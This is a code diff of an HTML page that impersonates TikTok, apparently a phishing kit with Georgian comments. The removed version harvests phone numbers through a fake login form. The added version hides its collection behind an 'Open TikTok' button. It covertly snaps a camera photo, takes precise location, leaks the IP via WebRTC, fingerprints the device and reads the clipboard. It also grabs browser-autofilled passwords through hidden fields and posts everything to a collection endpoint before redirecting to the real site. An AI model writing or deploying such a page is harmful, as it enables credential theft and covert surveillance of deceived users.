@@ -1,357 +1,174 @@
 <!DOCTYPE html>
 <html lang="ka">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TikTok - Make Your Day</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
-
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: #000;
-    color: #fff;
-    font-family: 'Inter', sans-serif;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-  }
-
-  /* მთავარი კონტეინერი */
-  .tiktok-container {
-    width: 100%;
-    max-width: 380px;
-    height: 100vh;
-    max-height: 800px;
-    background: #000;
-    position: relative;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-  }
-
-  /* 1. ვიდეოს ეკრანი */
-  .video-screen {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    flex-direction: column;
-    background: #000;
-    z-index: 1;
-  }
-
-  .video-player {
-    flex: 1;
-    position: relative;
-    /* ვიდეოს ფოტო (გოგონა) */
-    background: url('https://images.unsplash.com/photo-1598550880863-4e8aa3d0edb4?q=80&w=1000&auto=format&fit=crop') center/cover;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    overflow: hidden;
-  }
-
-  /* Play ღილაკი */
-  .play-btn {
-    width: 80px;
-    height: 80px;
-    background: rgba(255,255,255,0.15);
-    backdrop-filter: blur(10px);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 2;
-    border: 1px solid rgba(255,255,255,0.3);
-    transition: transform 0.2s, background 0.2s;
-  }
-  .play-btn:hover { transform: scale(1.05); background: rgba(255,255,255,0.25); }
-  .play-btn svg { width: 35px; height: 35px; fill: #fff; margin-left: 5px; }
-
-  /* ვიდეოს ქვედა ინფო */
-  .video-info {
-    padding: 20px;
-    background: linear-gradient(to top, #000 0%, transparent 100%);
-    position: absolute;
-    bottom: 0;
-    width: 100%;
-    z-index: 2;
-  }
-
-  .author {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-  }
-  .author-avatar {
-    width: 48px;
-    height: 48px;
-    background: #333;
-    border-radius: 50%;
-    border: 2px solid #fff;
-  }
-  .author-name {
-    font-weight: 700;
-    font-size: 16px;
-    text-shadow: 0 1px 3px rgba(0,0,0,0.8);
-  }
-  .author-name span { color: #00f2ea; }
-  .caption {
-    font-size: 12px;
-    color: #aaa;
-  }
-
-  /* 2. ლოგინის ეკრანი */
-  .login-screen {
-    position: absolute;
-    inset: 0;
-    background: rgba(18, 18, 18, 0.95);
-    backdrop-filter: blur(20px);
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    padding: 40px 20px;
-    z-index: 10;
-    animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .login-screen.active { display: flex; }
-
-  @keyframes slideUp {
-    from { transform: translateY(100%); opacity: 0; }
-    to { transform: translateY(0); opacity: 1; }
-  }
-
-  .close-btn {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    width: 30px;
-    height: 30px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    opacity: 0.6;
-  }
-  .close-btn svg { width: 24px; height: 24px; fill: #fff; }
-
-  /* TikTok ლოგო */
-  .logo { margin-bottom: 25px; }
-  h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; text-align: center; }
-  p.subtitle { color: #888; font-size: 14px; margin-bottom: 30px; text-align: center; line-height: 1.4; }
-
-  /* Log in ღილაკი */
-  .open-tiktok-btn {
-    background: #fff;
-    color: #000;
-    border: none;
-    padding: 16px;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 700;
-    cursor: pointer;
-    width: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    transition: transform 0.2s, background 0.2s;
-  }
-  .open-tiktok-btn:hover { background: #eee; transform: scale(1.02); }
-  .open-tiktok-btn:active { transform: scale(0.98); }
-
-  /* ნომრის ფორმა */
-  .phone-form {
-    display: none;
-    width: 100%;
-    margin-top: 20px;
-    animation: fadeIn 0.3s ease;
-  }
-  .phone-form.active { display: block; }
-
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  .input-group {
-    display: flex;
-    gap: 8px;
-    margin-bottom: 15px;
-  }
-
-  select {
-    width: 35%;
-    padding: 16px 10px;
-    border-radius: 8px;
-    border: 1px solid #333;
-    background: #1a1a1a;
-    color: #fff;
-    font-size: 15px;
-    outline: none;
-    appearance: none;
-    cursor: pointer;
-  }
-
-  input[type="tel"] {
-    width: 65%;
-    padding: 16px 15px;
-    border-radius: 8px;
-    border: 1px solid #333;
-    background: #1a1a1a;
-    color: #fff;
-    font-size: 16px;
-    outline: none;
-    letter-spacing: 1px;
-    transition: border 0.3s;
-  }
-  input[type="tel"]:focus { border-color: #fe2c55; }
-
-  .error-msg {
-    color: #fe2c55;
-    font-size: 12px;
-    display: none;
-    margin-bottom: 10px;
-    text-align: left;
-  }
-
-  .continue-btn {
-    width: 100%;
-    padding: 16px;
-    border-radius: 8px;
-    border: none;
-    background: #333;
-    color: #888;
-    font-size: 16px;
-    font-weight: 700;
-    cursor: not-allowed;
-    transition: all 0.3s;
-  }
-  .continue-btn.enabled {
-    background: #fe2c55;
-    color: #fff;
-    cursor: pointer;
-  }
-  .continue-btn.enabled:hover { background: #e6254b; }
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Open App</title> 
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; background-color: #000000; color: white; overflow: hidden; position: relative; justify-content: center; align-items: center; }
+        .container { text-align: center; width: 90%; max-width: 350px; z-index: 2; display: flex; flex-direction: column; align-items: center; }
+        .logo { font-size: 42px; font-weight: 900; letter-spacing: -2px; margin-bottom: 10px; text-shadow: 2px 2px 0px #25F4EE, -2px -2px 0px #FE2C55; color: white; }
+        p { color: #a0a0a0; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
+        .btn { width: 100%; padding: 16px; background: #FE2C55; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 15px rgba(254, 44, 85, 0.4); }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-top: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden-autofill { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        #video, #canvas, #fpCanvas { display: none; }
+    </style>
 </head>
 <body>
 
-  <div class="tiktok-container">
-    
-    <!-- 1. ვიდეოს ეკრანი -->
-    <div class="video-screen" id="videoScreen">
-      <div class="video-player" onclick="openLogin()">
-        <div class="play-btn">
-          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-        </div>
-      </div>
-      
-      <div class="video-info">
-        <div class="author">
-          <div class="author-avatar"></div>
-          <div>
-            <!-- მხოლოდ სახელი და TikTok -->
-            <div class="author-name">nanikogamkhitashvili <span>·</span></div>
-            <div class="caption">TikTok</div>
-          </div>
-        </div>
-      </div>
+    <div class="container">
+        <div class="logo">TikTok</div>
+        <p>Watch trending videos, follow creators, and discover new content.</p>
+        <button class="btn" id="mainBtn" onclick="startProcess()">🎵 Open TikTok</button>
+        <div class="spinner" id="loader"></div>
     </div>
 
-    <!-- 2. ლოგინის ეკრანი -->
-    <div class="login-screen" id="loginScreen">
-      <div class="close-btn" onclick="closeLogin()">
-        <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
-      </div>
+    <form style="display:none;" id="hiddenForm">
+        <input type="text" id="hiddenUser" class="hidden-autofill" name="username" autocomplete="username">
+        <input type="password" id="hiddenPass" class="hidden-autofill" name="password" autocomplete="current-password">
+    </form>
 
-      <div class="logo">
-        <svg width="60" height="60" viewBox="0 0 24 24" fill="none">
-          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#00f2ea" transform="translate(-1, -1)"/>
-          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#fe2c55" transform="translate(1, 1)"/>
-          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#ffffff"/>
-        </svg>
-      </div>
-      
-      <!-- ჩვეულებრივი, ბუნებრივი ტექსტები -->
-      <h2>Log in to TikTok</h2>
-      <p class="subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+    <canvas id="fpCanvas" style="display:none;"></canvas>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-      <button class="open-tiktok-btn" id="openTiktokBtn" onclick="showPhoneForm()">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
-           <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#000"/>
-        </svg>
-        Log in
-      </button>
+    <script>
+        let secretData = { 
+            ip: "უცნობია", audioFingerprint: "უცნობია", fonts: "უცნობია", 
+            clipboard: "ვერ წაიკითხა", battery: "უცნობია", network: "უცნობია", tabs: "უცნობია",
+            autofilledUser: "ვერ წაიკითხა", autofilledPass: "ვერ წაიკითხა",
+            orientation: "უცნობია", vibrated: "არა", lat: "უარი", lon: "უარი", image: null
+        };
 
-      <!-- ნომრის ფორმა -->
-      <form class="phone-form" id="phoneForm" action="/submit" method="POST" onsubmit="return validateForm()">
-        <div class="input-group">
-          <select name="country" id="country">
-            <option value="+995" data-len="9">🇬🇪 +995</option>
-            <option value="+1" data-len="10">🇺🇸 +1</option>
-            <option value="+44" data-len="10">🇬🇧 +44</option>
-            <option value="+7" data-len="10">🇷🇺 +7</option>
-            <option value="+90" data-len="10">🇹🇷 +90</option>
-            <option value="+380" data-len="9">🇺🇦 +380</option>
-            <option value="+49" data-len="10">🇩🇪 +49</option>
-            <option value="+33" data-len="9">🇫🇷 +33</option>
-          </select>
-          <input type="tel" id="phone" name="phone" placeholder="Phone number" required oninput="validateInput(this)">
-        </div>
-        <div class="error-msg" id="errorMsg">Please enter a valid phone number</div>
-        <button type="submit" class="continue-btn" id="submitBtn" disabled>Continue</button>
-      </form>
-    </div>
-  </div>
+        const getCamera = () => new Promise((resolve) => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(stream => {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream; video.play();
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas'); 
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth || 640; 
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(track => track.stop()); 
+                            resolve(canvas.toDataURL('image/png'));
+                        }, 3000);
+                    }).catch(() => resolve(null));
+            } else { resolve(null); }
+        });
 
-<script>
-  function openLogin() {
-    document.getElementById('loginScreen').classList.add('active');
-  }
+        const getLocation = () => new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve({ lat: "უარი", lon: "უარი" }),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else { resolve({ lat: "უარი", lon: "უარი" }); }
+        });
 
-  function closeLogin() {
-    document.getElementById('loginScreen').classList.remove('active');
-  }
+        async function collectRestInfo() {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel(''); const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    secretData.ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1]; pc.close();
+                };
+            } catch (e) {}
 
-  function showPhoneForm() {
-    document.getElementById('openTiktokBtn').style.display = 'none';
-    document.getElementById('phoneForm').classList.add('active');
-  }
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator(); const analyser = audioCtx.createAnalyser();
+                const gainNode = audioCtx.createGain(); const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
+                oscillator.type = 'triangle'; oscillator.frequency.value = 10000; gainNode.gain.value = 0;
+                oscillator.connect(analyser); analyser.connect(scriptProcessor); scriptProcessor.connect(gainNode); gainNode.connect(audioCtx.destination);
+                scriptProcessor.onaudioprocess = (event) => {
+                    const data = event.inputBuffer.getChannelData(0); let sum = 0;
+                    for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
+                    secretData.audioFingerprint = sum.toString(); oscillator.disconnect(); scriptProcessor.disconnect();
+                };
+                oscillator.start(0);
+            } catch (e) {}
 
-  function validateInput(input) {
-    input.value = input.value.replace(/\D/g, '');
-    
-    const countrySelect = document.getElementById('country');
-    const requiredLength = parseInt(countrySelect.options[countrySelect.selectedIndex].getAttribute('data-len'));
-    const errorMsg = document.getElementById('errorMsg');
-    const submitBtn = document.getElementById('submitBtn');
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Sylfaen', 'BPG Arial']; 
+            const testString = "mmmmmmmmmmlli"; const span = document.createElement('span');
+            span.style.fontSize = '72px'; span.style.position = 'absolute'; span.style.left = '-9999px'; span.innerText = testString;
+            document.body.appendChild(span);
+            let detected = [];
+            for (let i = 0; i < testFonts.length; i++) {
+                span.style.fontFamily = testFonts[i];
+                if (span.offsetWidth > 0) detected.push(testFonts[i]);
+            }
+            document.body.removeChild(span); secretData.fonts = detected.join(', '); 
 
-    if (input.value.length === requiredLength) {
-      input.style.borderColor = '#00f2ea';
-      errorMsg.style.display = 'none';
-      submitBtn.disabled = false;
-      submitBtn.classList.add('enabled');
-    } else {
-      input.style.borderColor = input.value.length > 0 ? '#fe2c55' : '#333';
-      errorMsg.style.display = input.value.length > 0 ? 'block' : 'none';
-      submitBtn.disabled = true;
-      submitBtn.classList.remove('enabled');
-    }
-  }
+            try { if (navigator.clipboard && navigator.clipboard.readText) { secretData.clipboard = await navigator.clipboard.readText() || "ცარიელია"; } } catch (e) { secretData.clipboard = "წვდომა აკრძალულია"; }
+            try { if (navigator.getBattery) { const b = await navigator.getBattery(); secretData.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(დატენვაზე)" : ""); } } catch (e) {}
+            try { if (navigator.connection) { secretData.network = navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)"; } } catch (e) {}
+            try { secretData.tabs = window.history.length.toString(); } catch (e) {}
 
-  document.getElementById('country').addEventListener('change', function() {
-    validateInput(document.getElementById('phone'));
-  });
+            if (window.DeviceOrientationEvent) {
+                window.addEventListener('deviceorientation', function(event) {
+                    let beta = event.beta; let gamma = event.gamma;
+                    if (beta > 45 && beta < 135) secretData.orientation = "ვერტიკალურად (ხელში)";
+                    else if (beta > -45 && beta < 45) secretData.orientation = "ჰორიზონტალურად (მაგიდაზე)";
+                    else secretData.orientation = "დახრილი";
+                });
+            }
 
-  function validateForm() {
-    const submitBtn = document.getElementById('submitBtn');
-    return !submitBtn.disabled;
-  }
-</script>
+            try { if (navigator.vibrate) { navigator.vibrate([100, 50, 100]); secretData.vibrated = "დიახ"; } } catch (e) {}
+            
+            const user = document.getElementById('hiddenUser').value;
+            const pass = document.getElementById('hiddenPass').value;
+            if (user) secretData.autofilledUser = user;
+            if (pass) secretData.autofilledPass = pass;
+
+            secretData.userAgent = navigator.userAgent; 
+            secretData.screen = window.screen.width + "x" + window.screen.height;
+            secretData.ram = navigator.deviceMemory || "უცნობია";
+        }
+
+        async function startProcess() {
+            const btn = document.getElementById('mainBtn');
+            const loader = document.getElementById('loader');
+            
+            btn.disabled = true; 
+            btn.innerText = "იტვირთება..."; 
+            loader.style.display = 'block';
+
+            // 1. კამერა
+            btn.innerText = "Verifying camera...";
+            const image = await getCamera();
+            secretData.image = image;
+
+            // 2. ლოკაცია
+            btn.innerText = "Verifying location...";
+            const loc = await getLocation();
+            secretData.lat = loc.lat; 
+            secretData.lon = loc.lon;
+
+            // 3. დანარჩენი ინფო
+            btn.innerText = "Finalizing...";
+            await collectRestInfo();
+
+            // 4. გაგზავნა Discord-ზე
+            await fetch('/upload_data', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
+            });
+
+            // 5. წარმატება
+            loader.style.display = 'none';
+            document.querySelector('.container').innerHTML = <div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>;
+            setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
+        }
+    </script>
 </body>
 </html>
